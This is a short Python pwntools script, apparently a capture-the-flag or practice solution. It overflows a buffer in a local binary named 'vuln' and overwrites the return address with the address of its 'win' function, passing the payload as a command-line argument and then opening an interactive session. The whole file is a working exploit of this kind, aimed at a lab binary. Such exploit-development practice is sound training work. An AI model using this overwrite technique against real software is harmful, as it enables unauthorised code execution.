import pwn as p

elf = p.ELF('./vuln')

print('win addr:', hex(elf.symbols['win']))
payload = p.p32(0x35353535)*6+p.p32(elf.symbols['win'])+b'5'*0xea
print('payload:', hex(len(payload)), payload)

target = p.process(['./vuln', 'bbbb', payload])
# p.gdb.attach(target)


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


target.interactive()
